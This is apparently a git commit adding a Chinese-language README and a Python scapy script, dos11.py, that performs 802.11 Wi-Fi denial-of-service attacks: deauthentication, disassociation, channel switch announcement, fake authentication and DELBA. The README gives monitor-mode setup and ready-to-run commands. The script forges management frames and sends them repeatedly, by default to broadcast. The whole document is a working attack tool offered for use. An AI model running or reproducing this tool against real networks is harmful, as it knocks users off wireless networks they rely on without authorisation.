e83fba82ddb97103ea081b08445d43b164512c66
Your Name <you@example.com>
2019-11-15 14:27:47 +0800

    first

---
+++ README.md
@@ -0,0 +1,44 @@
+# scapy 802.11 dos攻击
+
+## 前提条件
+#### 你需要有一块无线网卡并可以置于monitor模式并切换到相应信道,假设interface是wlan0,ap位于信道1：
+    iw dev wlan0 set type monitor (如果报错 先down掉: ip link set wlan0 down)
+    
+    iw dev wlan0 set channel 1 (如果之前down了网卡需要up起来：ip link set wlan up (如果rfkill报错 执行:rfkill unblock 0 (0是rfkill list 对应物理网卡的编号)))
+   
+#### 安装sacpy     
+    pip3 install scapy
+    
+    
+###  目前实现：
+    deauthentication 解认证攻击 可以广播，不能攻击开启了管理帧保护的ap
+    
+    disassociation   解连接 可以广播，不能攻击开启了管理帧保护的ap
+    
+    csa(channel switch announcement) 信道切换攻击
+    
+    fake_auth 假认证攻击 
+    
+    delba(delete block ack) ???-???-??? ミク表示这个攻击不明觉厉哦~~
+    
+
+## example
+#### deauthentication attack
+    ./dos11.py deauth --client-mac  FF:FF:FF:FF:FF:FF --ap-ssid wifi-ssid --ap-bssid 01:02:03:04:05:06 -i wlan0
+#### disassociation attack
+    ./dos11.py disas  --client-mac  FF:FF:FF:FF:FF:FF --ap-ssid wifi-ssid --ap-bssid 01:02:03:04:05:06 -i wlan0
+#### channel switch announcement
+    ./dos11.py csa --client-mac  FF:FF:FF:FF:FF:FF --ap-ssid wifi-ssid --ap-bssid 01:02:03:04:05:06 -i wlan0 --switch-channel 1
+#### fake auth 
+    ./dos11.py fake_auth --client-mac  FF:FF:FF:FF:FF:FF --ap-ssid wifi-ssid --ap-bssid 01:02:03:04:05:06 -i wlan0 --auth-algorithm 1 --interval 0
+#### delete block ack (maybe not work)
+    ./dos11.py delba --client-mac   FF:FF:FF:FF:FF:FF --ap-ssid wifi-ssid --ap-bssid 01:02:03:04:05:06 -i wlan0
+
+
+    
+
+    
+    
+
+    
+ 
---
+++ dos11.py
@@ -0,0 +1,150 @@
+#!/usr/bin/env python3
+
+from scapy.all import *
+import argparse
+import sys
+import time
+
+
+parser = argparse.ArgumentParser(description='802.11 dos attack',formatter_class=argparse.RawTextHelpFormatter)
+parser.add_argument('attack_type', metavar='attack_type', type=str, nargs='?',
+                    help=
+"""
+dos attack type. now support : 
+
+deauth     (deauthentication attack , not work in managed frame protect)
+disas      (disassociation attack,not work in managed frame protect)
+csa        (beacon frame with channel switch announcement)
+fake_auth  (send a authentication frame cause key lose)
+delba      (send a delete block action cause data lose) 
+""")
+
+
+parser.add_argument('-i', dest="iface", nargs='?', type=str, help='the wireless interface', required=True)
+parser.add_argument('-c', dest="count", nargs='?', type=int, help='number of packet send,0 or omit represent send until stop')
+parser.add_argument('--interval', dest="interval", nargs='?', type=float, help='send interval float type in second ,0 represent send as fast as possible')
+parser.add_argument('--ap-ssid', dest="ap_ssid", type=str, nargs="?", help='ap ssid')
+parser.add_argument('--ap-bssid', dest="ap_bssid", type=str, nargs='?', help='ap mac address', required=True)
+
+parser.add_argument('--client-mac', dest="client_mac", type=str, nargs="?",
+                    help='client mac address,default FF:FF:FF:FF:FF:FF ')
+
+parser.add_argument('--rate', dest="rate", nargs="+", type=int,
+                    help='beacon support rate tag,in decimal. default [0x82,]')
+
+parser.add_argument('--switch-channel', dest="channel", nargs="?", type=int,
+                    help='channel switch announcement need this flag,represent which cahnnel to switch')
+
+parser.add_argument('--deauth-reason', dest="reason", nargs="?", type=int, help='deauth reason code,default 3')
+
+parser.add_argument('--auth-algorithm', dest="auth_algorithm", nargs="?", type=int,
+                    help='fake authentication algorithm,0 is open auth,1 is pre share key, default 0')
+
+args = parser.parse_args()
+
+attack_type=args.attack_type
+ifc = args.iface
+interval = args.interval
+ap_mac = args.ap_bssid
+cli_mac = args.client_mac
+ssid = args.ap_ssid
+send_count = args.count
+broadcast = "FF:FF:FF:FF:FF:FF"
+if not cli_mac:
+    cli_mac = broadcast
+if not interval:
+    interval=0
+# beacon frame
+tag_num_ssid = 0
+tag_num_csa = 37
+tag_num_quiet = 40
+support_rates = args.rate
+channel = args.channel
+if not support_rates:
+    support_rates = [0x82, ]
+
+# deauth
+reason = args.reason
+if not reason:
+    reason = 3
+#fake auth
+auth_algorithm = args.auth_algorithm
+if not auth_algorithm:
+    auth_algorithm=0
+
+
+def beacon_frame():
+    return RadioTap() / Dot11(addr1=cli_mac, addr2=ap_mac, addr3=ap_mac, addr4=ap_mac) / \
+           Dot11Beacon(cap=0) / \
+           Dot11Elt(ID=tag_num_ssid, len=len(ssid), info=bytes(ssid, 'utf-8')) / Dot11EltRates(rates=support_rates)
+
+
+def switch_channel_annountation():
+    if not channel:
+        print("channel must provide in csa")
+        sys.exit(1)
+    return beacon_frame() / Dot11Elt(ID=tag_num_csa, len=3, info=bytes([0, channel, 1]))
+
+
+def beacon_quiet():
+    return beacon_frame() / Dot11Elt(ID=tag_num_quiet, len=6, info=bytes([0,0,4000&0xff,4000>>8,0,0]))
+
+def deauth():
+    return RadioTap() / Dot11(addr1=cli_mac, addr2=ap_mac, addr3=ap_mac, addr4=ap_mac) / Dot11Deauth(reason=reason)
+
+
+def disassociation():
+    return RadioTap() / Dot11(addr1=cli_mac, addr2=ap_mac, addr3=ap_mac, addr4=ap_mac) / Dot11Disas(reason=reason)
+
+
+def fake_auth():
+    return RadioTap() / Dot11(addr1=ap_mac, addr2=cli_mac, addr3=ap_mac, addr4=cli_mac) / Dot11Auth(algo=auth_algorithm, seqnum=1,
+                                                                                                    status=0)
+
+def del_block_ack():
+    class Dot11DELBA(Packet):
+        name = "802.11 DELBA"
+        fields_desc = [
+            ByteField("category", 3),
+            ByteField("action", 2),
+            LEShortField("param", 0),
+           LEShortField("reason", 0),
+        ]
+
+    return RadioTap() / Dot11(addr1=ap_mac, addr2=cli_mac, addr3=ap_mac,type=0,subtype=13) / Dot11DELBA(param=0,reason=37)
+attack = {
+    "deauth": deauth,
+    "csa": switch_channel_annountation,
+    "disas": disassociation,
+    "fake_auth": fake_auth,
+    "quiet": beacon_quiet,
+    "delba": del_block_ack,
+}
+
+if __name__ == "__main__":
+    i=0
+    def print_send():
+        global i
+        print('\rsend frame count: %d' %i,end="")
+
+
+    try:
+        frame=attack[attack_type]()
+        if not send_count:
+            while 1:
+                i += 1
+                sendp(frame,iface=ifc,verbose=False)
+                print_send()
+                time.sleep(interval)
+        else:
+            for _ in range(send_count):
+                i += 1
+                sendp(frame, iface=ifc, verbose=False)
+                print_send()
+                time.sleep(interval)
+        print_send()
+    except KeyError :
+        print("unknow attack type %s" %attack_type)
+
+
+
